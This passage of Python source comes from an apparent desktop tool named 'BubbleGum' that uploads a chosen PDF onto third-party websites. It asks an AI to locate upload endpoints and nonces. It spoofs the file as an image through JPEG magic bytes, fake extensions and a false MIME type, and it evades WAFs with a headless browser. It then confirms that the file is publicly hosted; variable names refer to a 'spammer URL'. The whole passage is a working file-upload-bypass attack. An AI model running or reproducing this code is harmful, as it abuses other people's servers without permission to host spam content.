                    url_found = self.techniques[-1].get('upload_url', '')
                    if url_found and self._verify_url(url_found):
                        self._auto_info['endpoints_tried'] = total_tried
                        return

        self._auto_info['endpoints_tried'] = total_tried

        # If WAF blocked everything, retry using the headless browser
        if self._waf_detected and not any(t['success'] for t in self.techniques):
            self._browser_upload_pass(endpoints, bypass_variants)
            self._close_browser()

    def _browser_upload_pass(self, endpoints, bypass_variants):
        """Retry uploads through the headless browser (bypasses WAF + TLS checks)."""
        driver = self._driver if hasattr(self, '_driver') else None
        if not driver:
            return

        # First: try the smart approach — find form page, extract nonce, upload properly
        info = self._parse_spammer_url()
        self._browser_find_form_and_upload(info['site_root'], info['plugin'])
        # Check if it worked
        if any(t['success'] for t in self.techniques):
            return

        # Fallback: brute-force endpoints through browser fetch
        base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
        tried = 0

        for ep in endpoints:
            if ep.get('body_type') in ('put_direct', 'xmlrpc'):
                continue  # Skip non-multipart types in browser

            ep_name = ep.get('name', 'Unknown')
            field = ep.get('field', 'file')
            extra = ep.get('extra')

            if ep.get('body_type') == 'raw':
                # Raw POST via browser fetch
                tried += 1
                hdrs = dict(ep.get('headers') or {})
                for k, v in hdrs.items():
                    if '{filename}' in v:
                        hdrs[k] = v.replace('{filename}', self.pdf_filename)
                ct = hdrs.get('Content-Type', 'application/pdf')
                cd = hdrs.get('Content-Disposition', '')
                b64data = base64.b64encode(self.pdf_bytes).decode()
                js = f"""
                return await (async () => {{
                    try {{
                        const raw = atob('{b64data}');
                        const arr = new Uint8Array(raw.length);
                        for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
                        const resp = await fetch('{ep["url"]}', {{
                            method: 'POST',
                            headers: {{'Content-Type': '{ct}', 'Content-Disposition': '{cd}'}},
                            body: arr
                        }});
                        const text = await resp.text();
                        return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
                    }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
                }})();
                """
                try:
                    res = json.loads(driver.execute_script(js))
                except Exception as e:
                    res = {'status': 0, 'body': str(e)}

                resp_text = res.get('body', '')
                status = res.get('status', 0)
                success = False
                upload_url_found = ''
                if 200 <= status < 400 and not self._is_waf_response(resp_text):
                    for kw in ['success', 'uploaded', '"url"', 'source_url', 'file_url']:
                        if kw in resp_text.lower():
                            success = True
                            break
                if success:
                    try:
                        rj = json.loads(resp_text)
                        for key in ['url', 'source_url', 'file_url', 'link']:
                            val = rj.get(key, '')
                            if isinstance(val, str) and val.startswith('http'):
                                upload_url_found = val
                                break
                    except Exception:
                        pass

                self.techniques.append({
                    'name': f'{ep_name} | Browser',
                    'http_status': status,
                    'success': success,
                    'response_snippet': resp_text[:500],
                    'upload_url': upload_url_found,
                })
                if success and upload_url_found and self._verify_url(upload_url_found):
                    self._auto_info['endpoints_tried'] += tried
                    return
                continue

            # Multipart upload via browser fetch
            for variant_name, filename, mime, file_bytes in bypass_variants:
                tried += 1
                res = self._browser_upload(ep['url'], field, filename, mime, file_bytes, extra)
                if not res:
                    continue

                resp_text = res.get('body', '')
                status = res.get('status', 0)
                success = False
                upload_url_found = ''
                if 200 <= status < 400 and not self._is_waf_response(resp_text):
                    for kw in ['success', 'uploaded', '"url"', 'source_url', 'file_url', 'tmp_name']:
                        if kw in resp_text.lower():
                            success = True
                            break
                if success:
                    try:
                        rj = json.loads(resp_text)
                        for key in ['url', 'source_url', 'file_url', 'link', 'path']:
                            val = rj.get(key, '')
                            if isinstance(val, str) and val.startswith('http'):
                                upload_url_found = val
                                break
                    except Exception:
                        pass

                self.techniques.append({
                    'name': f'{ep_name} | {variant_name} | Browser',
                    'http_status': status,
                    'success': success,
                    'response_snippet': resp_text[:500],
                    'upload_url': upload_url_found,
                })
                if success and upload_url_found and self._verify_url(upload_url_found):
                    self._auto_info['endpoints_tried'] += tried
                    return

        self._auto_info['endpoints_tried'] += tried

    def _analyze_form_page(self):
        """GET the page, then ask AI to analyze the form."""
        status, headers, body = self._request('GET', self.target)
        if status == 0:
            return None
        html = body.decode('utf-8', errors='replace')[:15000]
        prompt = (
            "Analyze this HTML page that contains a file upload form. "
            "I need to upload a file via AJAX, NOT submit the HTML form. "
            "Identify:\n"
            "1. The AJAX file upload endpoint URL — this is NOT the form action URL. "
            "For WordPress sites, this is always /wp-admin/admin-ajax.php. "
            "For other CMSes, look for AJAX/API endpoints in the page's JavaScript.\n"
            "2. The file upload input field name.\n"
            "3. Any required extra fields: nonce/token values, AJAX action parameters "
            "(e.g. for WordPress: action=upload-attachment or action=async-upload), etc.\n"
            "4. The expected MIME types.\n"
            "5. The CMS/framework/technology (e.g. WordPress, Drupal, custom).\n\n"
            "IMPORTANT: If this is a WordPress site, set action_url to the site's "
            "/wp-admin/admin-ajax.php and include any nonce values and the WordPress "
            "AJAX action name in extra_fields.\n\n"
            "Return ONLY a JSON object like: "
            '{"action_url": "/wp-admin/admin-ajax.php", "upload_field": "async-upload", '
            '"extra_fields": {"action": "upload-attachment", "_wpnonce": "..."}, '
            '"expected_mime": "image/jpeg", "technology": "WordPress"}\n\n'
            f"Page URL: {self.target}\n\nHTML:\n{html}"
        )
        raw = self._call_ai(prompt, max_tokens=1024)
        if not raw:
            return None
        m = re.search(r'\{.*\}', raw, re.DOTALL)
        if not m:
            return None
        try:
            return json.loads(m.group(0))
        except (json.JSONDecodeError, ValueError):
            return None

    def _analyze_direct_endpoint(self):
        """Try OPTIONS/GET on endpoint, ask AI to analyze."""
        status, headers, body = self._request('OPTIONS', self.target)
        info = f"OPTIONS {self.target} → {status}\nHeaders: {json.dumps(headers, default=str)}\n"
        status2, headers2, body2 = self._request('GET', self.target)
        snippet = body2.decode('utf-8', errors='replace')[:5000]
        info += f"\nGET → {status2}\nBody snippet: {snippet}"
        prompt = (
            "Analyze this upload endpoint. Based on the responses below, identify: "
            "the upload field name, any required extra parameters, the expected MIME type, "
            "and the technology/CMS. "
            "Return ONLY a JSON object like: "
            '{"action_url": "...", "upload_field": "file", "extra_fields": {}, '
            '"expected_mime": "image/jpeg", "technology": "unknown"}\n\n' + info
        )
        raw = self._call_ai(prompt, max_tokens=1024)
        if not raw:
            return None
        m = re.search(r'\{.*\}', raw, re.DOTALL)
        if not m:
            return None
        try:
            return json.loads(m.group(0))
        except (json.JSONDecodeError, ValueError):
            return None

    def _resolve_action_url(self, action_url):
        """Resolve relative action URL against target."""
        if not action_url:
            return self.target
        if action_url.startswith(('http://', 'https://')):
            return action_url
        parsed = urllib.parse.urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        if action_url.startswith('/'):
            return base + action_url
        # relative
        path = parsed.path
        if '/' in path:
            path = path[:path.rfind('/') + 1]
        return base + path + action_url

    def _try_upload(self, name, upload_url, field_name, filename, mime, file_bytes, extra_fields):
        """Attempt a single upload technique. Returns technique result dict."""
        body, ct = self._multipart_body(field_name, filename, mime, file_bytes, extra_fields)
        status, resp_headers, resp_body = self._request('POST', upload_url, {'Content-Type': ct}, body)
        resp_text = resp_body.decode('utf-8', errors='replace')

        # Detect success
        success = False
        upload_url_found = ''
        # If response is an HTML page or WAF/captcha, it's NOT a successful upload
        trimmed = resp_text.strip().lower()
        is_html = (trimmed.startswith(('<!doctype', '<html'))
                   or '<form' in resp_text[:2000].lower()
                   or '</html>' in resp_text[-200:].lower())
        is_waf = self._is_waf_response(resp_text)
        success_keywords = ['success', 'uploaded', '"url"', '"link"', '"path"',
                            'source_url', 'file_url', 'media_url']
        if 200 <= status < 400 and not is_html and not is_waf:
            lower = resp_text.lower()
            for kw in success_keywords:
                if kw in lower:
                    success = True
                    break

        # Try to extract URL from JSON response
        if success:
            try:
                rj = json.loads(resp_text)
                for key in ['url', 'file_url', 'source_url', 'link', 'path',
                            'data.url', 'attachment_url', 'media_url', 'location']:
                    val = rj.get(key, '')
                    if not val and '.' in key:
                        parts = key.split('.')
                        nested = rj
                        for p in parts:
                            if isinstance(nested, dict):
                                nested = nested.get(p, {})
                            else:
                                nested = {}
                        if isinstance(nested, str):
                            val = nested
                    if isinstance(val, str) and val.startswith('http'):
                        upload_url_found = val
                        break
            except (json.JSONDecodeError, ValueError):
                pass

        # Try to find URL in response text via regex (only non-HTML short responses)
        if success and not upload_url_found and not is_html and len(resp_text) < 5000:
            url_patterns = re.findall(r'https?://[^\s"\'<>]+\.(?:pdf|jpg|jpeg|png|gif)', resp_text, re.I)
            if url_patterns:
                upload_url_found = url_patterns[0]

        result = {
            'name': name,
            'http_status': status,
            'success': success,
            'response_snippet': resp_text[:500],
            'upload_url': upload_url_found
        }
        self.techniques.append(result)
        return result

    def _verify_url(self, url):
        """GET a URL and check if it serves a PDF."""
        if not url:
            return False
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            if resp.getcode() != 200:
                return False
            ct = resp.headers.get('Content-Type', '')
            body = resp.read(1024)
            return 'application/pdf' in ct or body[:5] == b'%PDF-'
        except Exception:
            return False

    def run(self):
        """Run the full upload pipeline. Returns result dict."""
        # Auto mode: parse spammer URL, direct upload, skip AI
        if self.mode == 'auto':
            self._auto_upload()
            # Jump to result construction (Step 3 below)
            return self._build_result()

        # Step 1: Analyze the target
        if self.mode == 'form_page':
            self.analysis = self._analyze_form_page()
        else:
            self.analysis = self._analyze_direct_endpoint()

        # Defaults if AI analysis failed
        upload_url = self.target
        field_name = 'file'
        extra_fields = {}
        technology = ''
        if self.analysis:
            if self.analysis.get('action_url'):
                upload_url = self._resolve_action_url(self.analysis['action_url'])
            if self.analysis.get('upload_field'):
                field_name = self.analysis['upload_field']
            if self.analysis.get('extra_fields') and isinstance(self.analysis['extra_fields'], dict):
                extra_fields = self.analysis['extra_fields']
            technology = (self.analysis.get('technology') or '').lower()

        # WordPress detection: ensure we use admin-ajax.php
        parsed_target = urllib.parse.urlparse(self.target)
        base_site = f"{parsed_target.scheme}://{parsed_target.netloc}"
        is_wordpress = 'wordpress' in technology or 'wp' in technology

        upload_urls = [upload_url]
        if is_wordpress or self.mode == 'form_page':
            wp_ajax = base_site + '/wp-admin/admin-ajax.php'
            if wp_ajax not in upload_urls:
                upload_urls.insert(0, wp_ajax)

        # For WordPress, ensure we have the right AJAX action fields
        wp_extra_fields_variants = []
        if is_wordpress:
            for wp_action in ['upload-attachment', 'async-upload']:
                ef = dict(extra_fields)
                ef['action'] = wp_action
                wp_extra_fields_variants.append(ef)
            if not wp_extra_fields_variants:
                wp_extra_fields_variants.append(extra_fields)
        else:
            wp_extra_fields_variants.append(extra_fields)

        # Step 2: Try bypass techniques
        base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
        jpeg_pdf = JPEG_HEADER + self.pdf_bytes  # JPEG magic + PDF content

        techniques = [
            ('JPEG magic + .jpg + image/jpeg', f'{base_name}.jpg', 'image/jpeg', jpeg_pdf),
            ('Raw PDF + .jpg + image/jpeg', f'{base_name}.jpg', 'image/jpeg', self.pdf_bytes),
            ('JPEG magic + .pdf + image/jpeg', self.pdf_filename, 'image/jpeg', jpeg_pdf),
            ('Raw PDF + .pdf + image/jpeg', self.pdf_filename, 'image/jpeg', self.pdf_bytes),
            ('Double ext .pdf.jpg', f'{self.pdf_filename}.jpg', 'image/jpeg', self.pdf_bytes),
            ('Normal PDF upload', self.pdf_filename, 'application/pdf', self.pdf_bytes),
        ]

        # If no AI analysis, also try common field names
        field_names = [field_name]
        if not self.analysis:
            for f in ['file', 'upload', 'attachment', 'media', 'document', 'Filedata',
                       'async-upload', 'files[]', 'image', 'photo']:
                if f not in field_names:
                    field_names.append(f)

        for u_url in upload_urls:
            for ef in wp_extra_fields_variants:
                for t_name, filename, mime, file_bytes in techniques:
                    for fn in field_names:
                        suffix = ''
                        if fn != field_name:
                            suffix += f' (field={fn})'
                        if u_url != upload_url:
                            suffix += ' (wp-ajax)'
                        if ef.get('action') and ef.get('action') != extra_fields.get('action'):
                            suffix += f' (action={ef["action"]})'
                        label = t_name + suffix
                        self._try_upload(label, u_url, fn, filename, mime, file_bytes, ef)

        # Step 3: Build result
        return self._build_result(upload_url=upload_url, base_name=base_name)

    def _build_result(self, upload_url=None, base_name=None):
        """Find best result, verify URLs, return result dict."""
        if base_name is None:
            base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
        if upload_url is None:
            upload_url = self.target

        verified_url = ''
        best_url = ''
        for t in self.techniques:
            if t['success'] and t['upload_url']:
                if not best_url:
                    best_url = t['upload_url']
                if self._verify_url(t['upload_url']):
                    verified_url = t['upload_url']
                    break

        # Try to construct common URL patterns if we got success but no URL
        if not verified_url and any(t['success'] for t in self.techniques):
            parsed = urllib.parse.urlparse(upload_url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            now = time.strftime('%Y/%m')
            candidates = [
                f"{base}/wp-content/uploads/{now}/{self.pdf_filename}",
                f"{base}/wp-content/uploads/{now}/{base_name}.jpg",
                f"{base}/uploads/{self.pdf_filename}",
                f"{base}/media/{self.pdf_filename}",
                f"{base}/files/{self.pdf_filename}",
            ]

            # Auto mode: also try the spammer's upload subpath
            auto_info = getattr(self, '_auto_info', None)
            if auto_info:
                spammer = self._parse_spammer_url()
                site = spammer['site_root']
                subpath = spammer['upload_subpath']
                candidates.insert(0, f"{site}{subpath}{self.pdf_filename}")
                candidates.insert(1, f"{site}{subpath}{base_name}.jpg")

            for cand in candidates:
                if self._verify_url(cand):
                    verified_url = cand
                    break

        return {
            'analysis': self.analysis,
            'techniques': self.techniques,
            'verified_url': verified_url,
            'best_url': best_url if best_url and not verified_url else '',
            'success': bool(verified_url),
            'partial': bool(best_url) and not bool(verified_url),
            'auto_info': getattr(self, '_auto_info', None),
            'fail_reason': '' if verified_url else (
                'Upload returned a URL but PDF could not be verified at that location.'
                if best_url else
                'All bypass techniques failed or no upload URL could be detected.'
            )
        }


def get_serve_dir():
    """Directory containing bubblegum.html. Prefers APPDATA updated copy."""
    updated_html = os.path.join(UPDATE_DIR, "bubblegum.html")
    if os.path.exists(updated_html):
        return UPDATE_DIR
    if getattr(sys, "frozen", False):
        return sys._MEIPASS
    return os.path.dirname(os.path.abspath(__file__))


class QuietHandler(SimpleHTTPRequestHandler):
    """Serves from the bundled directory, suppresses console logs."""
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=get_serve_dir(), **kwargs)

    def log_message(self, format, *args):
        pass  # silent

    def do_GET(self):
        """Route /proxy requests, serve files for everything else."""
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == '/proxy':
            self._handle_proxy(parsed.query)
        else:
            super().do_GET()

    def do_POST(self):
        """Route POST requests."""
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == '/vulnscan/upload':
            self._handle_vulnscan_upload()
        elif parsed.path == '/vulnscan/test':
            self._handle_vulnscan_test()
        elif parsed.path == '/upload-pdf':
            self._handle_upload_pdf()
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        """CORS preflight."""
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def _send_json(self, code, data):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)

    def _handle_vulnscan_upload(self):
        global _vulnscan_pdf
        content_type = self.headers.get('Content-Type', '')
        content_length = int(self.headers.get('Content-Length', 0))

        if content_length > 5 * 1024 * 1024:
            self._send_json(400, {"error": "PDF must be under 5MB"})
            return

        body = self.rfile.read(content_length)

        # Parse boundary from Content-Type
        boundary = None
        for part in content_type.split(';'):
            p = part.strip()
            if p.startswith('boundary='):
                boundary = p[9:].strip('"')
                break

        if not boundary:
            self._send_json(400, {"error": "No multipart boundary found"})
            return

        # Manual multipart parsing
        delimiter = ('--' + boundary).encode()
        parts = body.split(delimiter)
        filename = 'test.pdf'
        file_bytes = None

        for part in parts:
            if b'Content-Disposition' not in part:
                continue
            header_end = part.find(b'\r\n\r\n')
            if header_end < 0:
                continue
            headers_raw = part[:header_end].decode('utf-8', errors='replace')
            data = part[header_end + 4:]
            if data.endswith(b'\r\n'):
                data = data[:-2]
            if 'filename=' in headers_raw:
                m = re.search(r'filename="([^"]*)"', headers_raw)
                if m:
                    filename = m.group(1)
                file_bytes = data

        if file_bytes is None:
            self._send_json(400, {"error": "No file found in upload"})
            return

        _vulnscan_pdf = {"bytes": file_bytes, "filename": filename}
        self._send_json(200, {"ok": True, "filename": filename, "size": len(file_bytes)})

    def _handle_vulnscan_test(self):
        global _vulnscan_pdf
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        try:
            data = json.loads(body)
        except Exception:
            self._send_json(400, {"error": "Invalid JSON"})
            return

        url = data.get('url', '').strip()
        if not url:
            self._send_json(400, {"error": "Missing url"})
            return
        if not url.startswith(('http://', 'https://')):
            self._send_json(400, {"error": "URL must start with http:// or https://"})
            return

        if not _vulnscan_pdf:
            self._send_json(400, {"error": "No PDF uploaded. Upload a PDF first."})
            return

        timeout = data.get('timeout', 10)
        delay = data.get('delay', 0.5)
        ai_key = data.get('ai_key', '')
        oai_key = data.get('oai_key', '')
        ai_model = data.get('model', '')

        scanner = VulnScanner(
            url, _vulnscan_pdf['bytes'], _vulnscan_pdf['filename'],
            check_timeout=timeout, delay=delay,
            ai_key=ai_key, oai_key=oai_key, ai_model=ai_model
        )
        try:
            result = scanner.run_all_checks()
            result['_debug'] = scanner._debug_log
            self._send_json(200, result)
        except Exception:
            import traceback
            tb = traceback.format_exc()
            print(f"[VULNSCAN ERROR] {tb}", flush=True)
            self._send_json(500, {
                "error": "Scan crashed",
                "traceback": tb,
                "_debug": getattr(scanner, '_debug_log', []),
            })

    def _handle_upload_pdf(self):
        """Handle PDF upload to a target endpoint with AI analysis + bypass techniques."""
        content_type = self.headers.get('Content-Type', '')
        content_length = int(self.headers.get('Content-Length', 0))

        if content_length > 20 * 1024 * 1024:
            self._send_json(400, {"error": "Request must be under 20MB"})
            return

        body = self.rfile.read(content_length)

        # Parse multipart
        boundary = None
        for part in content_type.split(';'):
            p = part.strip()
            if p.startswith('boundary='):
                boundary = p[9:].strip('"')
                break

        if not boundary:
            self._send_json(400, {"error": "No multipart boundary found"})
            return

        delimiter = ('--' + boundary).encode()
        parts = body.split(delimiter)
        fields = {}
        pdf_bytes = None
        pdf_filename = 'document.pdf'

        for part in parts:
            if b'Content-Disposition' not in part:
                continue
            header_end = part.find(b'\r\n\r\n')
            if header_end < 0:
                continue
            headers_raw = part[:header_end].decode('utf-8', errors='replace')
            data = part[header_end + 4:]
            if data.endswith(b'\r\n'):
                data = data[:-2]

            if 'filename=' in headers_raw:
                m = re.search(r'filename="([^"]*)"', headers_raw)
                if m:
                    pdf_filename = m.group(1)
                pdf_bytes = data
            else:
                m = re.search(r'name="([^"]*)"', headers_raw)
                if m:
                    fields[m.group(1)] = data.decode('utf-8', errors='replace')

        target_url = fields.get('target_url', '').strip()
        mode = fields.get('mode', 'form_page')
        ai_key = fields.get('ai_key', '')
        oai_key = fields.get('oai_key', '')
        ai_model = fields.get('ai_model', '')

        if not target_url:
            self._send_json(400, {"error": "Missing target URL"})
            return
        if not target_url.startswith(('http://', 'https://')):
            self._send_json(400, {"error": "URL must start with http:// or https://"})
            return
        if pdf_bytes is None:
            self._send_json(400, {"error": "No PDF file found in upload"})
            return

        uploader = PdfUploader(
            target_url, mode, pdf_bytes, pdf_filename,
            ai_key=ai_key, oai_key=oai_key, ai_model=ai_model
        )
        try:
            result = uploader.run()
            self._send_json(200, result)
        except Exception:
            import traceback
            tb = traceback.format_exc()
            print(f"[UPLOAD-PDF ERROR] {tb}", flush=True)
            self._send_json(500, {"error": "Upload failed", "traceback": tb})

    def _handle_proxy(self, query):
        """Fetch a URL server-side and return raw HTML (CORS bypass).
        Forwards real HTTP status via X-Proxy-Status and final URL via X-Proxy-Url."""
        params = urllib.parse.parse_qs(query)
        url = params.get('url', [''])[0]
        if not url:
            self.send_error(400, 'Missing url parameter')
            return
        if not url.startswith(('http://', 'https://')):
            self.send_error(400, 'URL must start with http:// or https://')
            return
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                resp = urllib.request.urlopen(req, timeout=15, context=ctx)
                real_status = resp.getcode()
                final_url = resp.geturl()
                data = resp.read(5 * 1024 * 1024)  # 5MB limit
                resp.close()
            except urllib.error.HTTPError as he:
                # Still return body for 404/410/etc so JS can inspect content
                real_status = he.code
                final_url = url
                data = he.read(5 * 1024 * 1024)
                he.close()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('X-Proxy-Status', str(real_status))
            self.send_header('X-Proxy-Url', final_url)
            self.send_header('Access-Control-Expose-Headers', 'X-Proxy-Status, X-Proxy-Url')
            self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            self.send_response(502)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('X-Proxy-Status', '502')
            self.send_header('X-Proxy-Url', url)
            self.send_header('Access-Control-Expose-Headers', 'X-Proxy-Status, X-Proxy-Url')
            self.end_headers()
            self.wfile.write(str(e).encode())


def kill_port(port):
    """Kill any process using the given port (Windows)."""
    try:
        out = subprocess.check_output(
            f"netstat -ano | findstr :{port}", shell=True, text=True,
            stderr=subprocess.DEVNULL
        )
        pids = set()
        for line in out.strip().splitlines():
            parts = line.split()
            if parts and parts[-1].isdigit():
                pids.add(parts[-1])
        for pid in pids:
            subprocess.run(f"taskkill /F /PID {pid}", shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def port_available(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("127.0.0.1", port)) != 0


def start_server():
    """Start HTTP server on PORT, kill existing if needed."""
    if not port_available(PORT):
        kill_port(PORT)
        time.sleep(0.5)

    server = HTTPServer(("127.0.0.1", PORT), QuietHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    if not is_activated():
        if not show_activation_dialog():
            sys.exit(0)

    # Auto-update from GitHub before starting server
    app_updated = auto_update()
    if app_updated:
        # bubblegum_app.py itself was updated — re-exec the new version
        # This call won't return; it replaces the current process
        _maybe_reexec()

    server = start_server()
    url = f"http://127.0.0.1:{PORT}/bubblegum.html"

    # Brief pause for server startup
    time.sleep(0.3)
    webbrowser.open(url)

    print(f"BubbleGum running at {url}")
    print("Close this window to stop the server.")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


if __name__ == "__main__":
    # If an updated bubblegum_app.py exists in APPDATA, run that instead
    _maybe_reexec()
    main()
